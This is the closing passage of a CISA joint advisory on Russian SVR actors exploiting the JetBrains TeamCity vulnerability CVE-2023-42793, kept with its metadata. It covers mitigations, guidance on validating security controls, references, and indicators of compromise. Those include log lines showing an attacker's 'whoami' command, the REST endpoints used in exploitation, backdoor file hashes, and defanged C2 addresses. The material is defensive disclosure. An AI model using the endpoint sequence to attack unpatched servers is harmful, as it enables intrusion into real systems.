issued by JetBrains TeamCity in mid\\-September 2023, if not already completed.\n* **Monitor the network** \n for evidence of encoded commands and execution of network scanning tools.\n* **Ensure host\\-based anti\\-virus/endpoint monitoring solutions are enabled** \n and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.\n* **Require use of multi\\-factor authentication** \n \\[\n [CPG 1\\.3](https://www.cisa.gov/resources-tools/resources/cpg-report \"CPG Report\") \n ] for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n\t+ Organizations should adopt multi\\-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.\n* **Keep all operating systems, software, and firmware up to date.** \n Immediately configure newly\\-added systems to the network, including those used for testing or development work, to follow the organization\u2019s security baseline and incorporate into enterprise monitoring tools.\n* **Audit log files** \n to identify attempts to access privileged certificates and creation of fake identity providers.\n* **Deploy software to identify suspicious behavior on systems.**\n* **Deploy endpoint protection systems** \n with the ability to monitor for behavioral indicators of compromise.\n* **Use available public resources to identify credential abuse with cloud environments.**\n* **Configure authentication mechanisms** \n to confirm certain user activities on systems, including registering new devices.\n\n\n### **VALIDATE SECURITY CONTROLS**\n\n\n\n In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT\\&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT\\&CK techniques described in this advisory.\n \n\n\n\n To get started:\n \n\n\n1. Select an ATT\\&CK technique described in this advisory (see previous tables).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies\u2019 performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.\n6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.\n\n\n\n FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT\\&CK techniques identified in this advisory.\n \n\n\n### **REFERENCES**\n\n\n* FBI, DHS, CISA, Joint Cyber Security Advisory,\n [Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116afile:///C:/Users/hobrien/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/1W96RGIZ/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf \"Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\")\n* NSA, CISA, FBI, Joint Cyber Security Advisory\n **,** \n[Russian SVR Targets U.S. and Allied Networks](https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF \"Russian SVR Targets U.S. and Allied Networks\")\n* CISA,\n [Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise](https://www.cisa.gov/news-events/news/remediating-networks-affected-solarwinds-and-active-directorym365-compromise \"Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise\")\n* CISA, Alert (AA21\\-008A),\n [Detecting Post\\-Compromise Threat Activity in Microsoft Cloud Environments](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a \"Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments\")\n* CISA, Alert (AA20\\-352A),\n [Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a \"Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations\")\n* CISA, CISA Insights,\n [What Every Leader Needs to Know About the Ongoing APT Cyber Activity](https://www.cisa.gov/sites/default/files/publications/CISA%20Insights%20-%20What%20Every%20Leader%20Needs%20to%20Know%20About%20the%20Ongoing%20APT%20Cyber%20Activity%20-%20FINAL_508.pdf \"What Every Leader Needs to Know About the Ongoing APT Cyber Activity\")\n* FBI, CISA, Joint Cybersecurity Advisory,\n [Advanced Persistent Threat Actors Targeting U.S. Think Tanks](https://www.cisa.gov/sites/default/files/publications/AA20-336A-APT_Actors_Targeting_US_ThinkTanks.pdf \"Advanced Persistent Threat Actors Targeting U.S. Think Tanks\")\n* CISA,\n [Malicious Activity Targeting COVID\\-19 Research, Vaccine Development](https://www.cisa.gov/news-events/alerts/2020/07/16/malicious-activity-targeting-covid-19-research-vaccine-development \"Malicious Activity Targeting COVID-19 Research, Vaccine Development\")\n* NCSC, CSE, NSA, CISA, Advisory:\n [APT 29 Targets COVID\\-19 Vaccine Development](https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF \"APT 29 Targets COVID-19 Vaccine Development\")\n\n\n\n The information in this report is being provided \u201cas is\u201d for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.\n \n\n\n### **VERSION HISTORY**\n\n\n\n December 12, 2023: Initial version.\n \n\n\n### **APPENDIX A \u2013 INDICATORS OF COMPROMISE CVE\\-2023\\-42793**\n\n\n\n On a Windows system, the log file\n `C:\\TeamCity\\logs\\teamcity-server.log` \n will contain a log message when an attacker modified the\n `internal.properties` \n file. There will also be a log message for every process created via the\n `/app/rest/debug/processes` \n endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:\n \n\n\n\n`[2023-09-26 11:53:46,970] \u00a0 INFO - ntrollers.FileBrowseController - File edited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by user with id=1` \n  \n\n`[2023-09-26 11:53:46,970] \u00a0 INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified by \"user with id=1\"` \n  \n\n`[2023-09-26 11:53:58,227] \u00a0 INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe \"/c whoami\"` \n\n\n\n\n An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is\n [configured to sit behind a HTTP proxy](https://www.jetbrains.com/help/teamcity/configuring-proxy-server.html \"Configuring Proxy Server\") \n , the HTTP proxy may have suitable logs showing the following target endpoints being accessed:\n \n\n\n* `/app/rest/users/id:1/tokens/RPC2` \n \u2013 This endpoint is required to exploit the vulnerability.\n* `/app/rest/users` \n \u2013 This endpoint is only required if the attacker wishes to create an arbitrary user.\n* `/app/rest/debug/processes` \n \u2013 This endpoint is only required if the attacker wishes to create an arbitrary process.\n\n\n\n**Note:** \n The user ID value may be higher than 1\\.\n \n\n\n### **APPENDIX B \u2013 IOCS**\n\n\n#### ***File IoCs***\n\n\n\n GraphicalProton backdoor:\n \n\n\n* 01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732\n* 34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E\n* 620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869\n* 773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13\n* 7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53\n* 8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7\n* 971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC\n* CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n* CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43\n* EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E\n* F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB\n* C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4\n* 4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166\n\n\n\n GraphicalProton HTTPS backdoor:\n \n\n\n* 18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93\n* 19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641\n* 1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8\n* 219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67\n* 92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6\n* B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7\n* C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD\n* C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0\n* C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3\n* F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69\n\n\n\n Backdoored vcperf:\n \n\n\n* D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443\n\n\n\n Backdoored Zabbix installation archive:\n \n\n\n* 4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F\n\n\n\n Backdoored Webroot AV installation archive:\n \n\n\n* 950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4\n\n\n\n Modified rsockstun\n \n\n\n* CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n\n\n#### ***Network IoCs***\n\n\n#### ***Tunnel Endpoints***\n\n\n* 65\\.20\\.97\\[.]203\n* 65\\.21\\.51\\[.]58\n\n\n#### ***Exploitation Server***\n\n\n* 103\\.76\\.128\\[.]34\n\n\n#### ***GraphicalProton HTTPS C2 URL:***\n\n\n\n hxxps://matclick\\[.]com/wp\\-query\\[.]php\n \n\n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\n\n### Tags\n\n\n\n\n Topics\n \n\n[Nation\\-State Cyber Actors](/topics/cyber-threats-and-advisories/nation-state-cyber-actors) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n ,\n [Securing Networks](/topics/cyber-threats-and-advisories/securing-networks) \n\n\n\n\n MITRE ATT\\&CK TTP\n \n\n Command and Control (TA0011\\), Credential Access (TA0006\\), Defense Evasion (TA0005\\), Discovery (TA0007\\), Execution (TA0002\\), Exfiltration (TA0010\\), Initial Access (TA0001\\), Lateral Movement (TA0008\\), Persistence (TA0003\\), Privilege Escalation (TA0004\\), Reconnaissance (TA0043\\)\n \n\n\n\n Co\\-Sealers and Partners\n \n\n Federal Bureau of Investigation, International, National Security Agency\n \n\n\n\n Nation\\-State Actor\n \n\n Russia\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Jul 11, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-193A\n \n\n### [CISA Red Team\u2019s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense\\-in\\-Depth](/news-events/cybersecurity-advisories/aa24-193a)\n\n\n\n\n\n\n\n\n\n\n\n Jul 08, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-190A\n \n\n### [People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action](/news-events/cybersecurity-advisories/aa24-190a)\n\n\n\n\n\n\n\n\n\n\n\n May 10, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-131A\n \n\n### [\\#StopRansomware: Black Basta](/news-events/cybersecurity-advisories/aa24-131a)\n\n\n\n\n\n\n\n\n\n\n\n Apr 18, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-109A\n \n\n### [\\#StopRansomware: Akira Ransomware](/news-events/cybersecurity-advisories/aa24-109a)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": ["CVE-2023-42793"], "techniques": ["T1592.002", "T1505.001", "T1590.004", "T1574.002", "T1059.003", "T1003.002", "T1558.001", "T1053.005", "T1027.001", "T1003.001", "T1059.001", "T1562.001", "T1555.003", "T1564.001"], "advisory": "aa23-347a", "title": "Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally | CISA", "source": "cybersecurity-advisories", "id": "7fbf80f9135129762f3435b24db7a9594954f5e6c49b3661d7fef070bb23ef29"}